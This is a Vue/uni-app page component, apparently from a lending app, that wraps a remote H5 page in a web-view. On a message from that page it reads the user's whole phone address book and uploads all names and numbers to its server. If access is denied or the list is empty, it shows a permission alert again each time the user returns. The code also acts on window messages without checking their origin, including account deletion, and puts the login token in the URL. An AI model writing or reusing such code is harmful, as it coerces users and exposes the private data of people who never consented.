<template>
  <view class="agreement">
    <!-- 使用 :key="refreshKey" 控制 webview 组件在双端原地重载，安全不闪退 -->
    <web-view 
      v-if="url2" 
      :key="refreshKey" 
      :src="url2" 
      allow="camera *;geolocation *;" 
      :progress="false" 
      @message="handleH5Message" 
    />
  </view>
</template>

<script setup>
import { useUserStore } from '@/store'
import { ref, getCurrentInstance, onMounted, onUnmounted } from 'vue' 
import { onLoad, onReady, onUnload, onShow } from "@dcloudio/uni-app"
import { getToken, removeToken, setToken } from '@/utils/auth'
import { getSysConfigValue, set_other_contact } from '@/api/login.js'

const sysInfo = uni.getSystemInfoSync()
console.log(uni.getSystemInfoSync())

const url2 = ref('')
const refreshKey = ref(0) 
const { proxy } = getCurrentInstance()
const userStore = useUserStore()

// 拦截状态锁：只用于强制通讯录场景
let isLockingMode = false 

// 记录通讯录上报 Promise 状态
let contactUploadPromise = null 

/**
 * 1. 强制拦截弹窗
 */
const showForceAlert = () => {
  // #ifdef APP-PLUS
  plus.nativeUI.alert(
    "为了保障您的账户安全及正常使用借款服务，请务必开启通讯录权限。", 
    () => {
      isLockingMode = true
      uni.openAppAuthorizeSetting()
    }, 
    "权限申请", 
    "去开启"
  )
  // #endif
}

/**
 * 2. 读取和上报通讯录数据
 */
const fetchContactsData = () => {
  // #ifdef APP-PLUS
  contactUploadPromise = new Promise((resolve) => {
    plus.contacts.getAddressBook(
      plus.contacts.ADDRESSBOOK_PHONE,
      (addressbook) => {
        addressbook.find(
          null, 
          (contacts) => {
            const tempList = []

            contacts.forEach(item => {
              const name = item.displayName || '未知姓名'
              if (item.phoneNumbers && item.phoneNumbers.length > 0) {
                item.phoneNumbers.forEach(phoneObj => {
                  if (phoneObj.value) {
                    const cleanPhone = phoneObj.value.replace(/[\s\-]/g, '')
                    tempList.push({ name, phone: cleanPhone })
                  }
                })
              }
            })
            
            console.log('读取通讯录完成，最终有效数量：', tempList.length)

            if (tempList.length === 0) {
              console.warn('系统提示有权限，但获取到的通讯录数量为 0，判定为无效授权')
              resolve(false)
              return
            }

            set_other_contact({
              userId: userStore.user_info.userId,
              otherContact: JSON.stringify(tempList)
            }).then(() => {
              console.log('通讯录上报接口成功')
              resolve(true)
            }).catch(err => {
              console.error('通讯录上报接口失败：', err)
              resolve(false)
            })
          },
          (error) => { 
            console.error('读取通讯录失败：', error.message)
            resolve(false)
          },
          { multiple: true }
        )
      },
      (error) => { 
        console.error('获取通讯录对象失败：', error.message)
        resolve(false)
      }
    )
  })

  return contactUploadPromise
  // #endif

  // #ifndef APP-PLUS
  return Promise.resolve(false)
  // #endif
}

/**
 * 3. 当用户从系统设置页返回 App 时触发
 * 只用于强制通讯录场景
 */
onShow(() => {
  if (isLockingMode) {
    console.log('【回归检测】用户从设置页返回，正在重新校验通讯录数量...')
    
    // #ifdef APP-PLUS
    fetchContactsData().then(isSuccess => {
      contactUploadPromise = null

      if (isSuccess) {
        console.log('【回归成功】检测到真实有效通讯录且上报成功，解除锁定，刷新 H5')
        isLockingMode = false
        getloactionAndRefresh()
      } else {
        console.warn('【回归失败】数据依然为空或未给真实权限，继续弹窗锁定')
        showForceAlert()
      }
    })
    // #endif
  }
})

/**
 * 4. 核心业务逻辑处理
 */
const parseAndExecuteAction = async (noWEBData) => {
  console.log('解析业务动作数据：', noWEBData)
  
  if (!noWEBData) return

  if (noWEBData.action && noWEBData.action == 'three') {
    proxy.$tab.navigateTo(`/pages/mine/threeweb-view/index?url=${encodeURIComponent(noWEBData.path)}`)
  } else if (noWEBData.action && noWEBData.action == 'logout') {
    userStore.logOut().then(() => { proxy.$tab.reLaunch(`/pages/login`) })
  } else if (noWEBData.action && noWEBData.action == 'deleteAccount') {
    userStore.zxAction().then(() => { proxy.$tab.reLaunch(`/pages/login`) })
  } else if (noWEBData.action && noWEBData.action == 'needOtherConstact') {
    // #ifdef APP-PLUS
    const needOtherConstact = Number(noWEBData.needOtherConstact || noWEBData.value || 3)
    const isForce = needOtherConstact !== 2

    console.warn('收到 H5 的 needOtherConstact 指令：', needOtherConstact)

    const isSuccess = await fetchContactsData()
    contactUploadPromise = null

    if (isSuccess) {
      console.log('通讯录已成功拿到真实数据并上报，刷新 H5 状态')
      getloactionAndRefresh()
      return
    }

    if (isForce) {
      console.warn('强制通讯录未通过，触发强制弹窗')
      showForceAlert()
      return
    }

    console.warn('非强制通讯录未通过，本次不拦截用户')
    return
    // #endif
  }
}

/**
 * 原有的 App/小程序 端消息接收函数
 */
const handleH5Message = (e) => {
  const data = e.detail.data
  const [noWEBData] = data
  parseAndExecuteAction(noWEBData)
}

/**
 * H5 浏览器端消息接收监听
 */
// #ifdef H5
const handleWindowMessage = (event) => {
  let rawData = null
  if (event.data && event.data.arg && event.data.arg.data) {
    rawData = event.data.arg.data
  } else if (event.data && event.data.data) {
    rawData = event.data.data
  }

  if (rawData && Array.isArray(rawData)) {
    const [noWEBData] = rawData
    parseAndExecuteAction(noWEBData)
  }
}

onMounted(() => {
  window.addEventListener('message', handleWindowMessage)
})

onUnmounted(() => {
  window.removeEventListener('message', handleWindowMessage)
})
// #endif

const url = ref('')

onReady(() => {
  getUrl()
})

const getUrl = async () => {
  const systemInfo = uni.getSystemInfoSync()
  let res = await getSysConfigValue(systemInfo.appName)
  res = res ? JSON.parse(res) : {}

  url.value = res.h5DownloadUrl
  // url.value = 'http://192.168.1.253:8089/'

  // #ifdef APP-PLUS
  getloactionInitial()
  // #endif
  
  // #ifdef H5
  url2.value = `${url.value}?token=${getToken()}&statusHeight=${sysInfo.statusBarHeight}`
  // #endif
}

const getloactionInitial = () => {
  url2.value = `${url.value}?token=${getToken()}&statusHeight=${sysInfo.statusBarHeight}&appName=${sysInfo.appName}`
}

/**
 * 重新获取定位，并重载 webview
 */
const getloactionAndRefresh = () => {
  url2.value = `${url.value}?token=${getToken()}&statusHeight=${sysInfo.statusBarHeight}&appName=${sysInfo.appName}`
  refreshKey.value++
}
</script>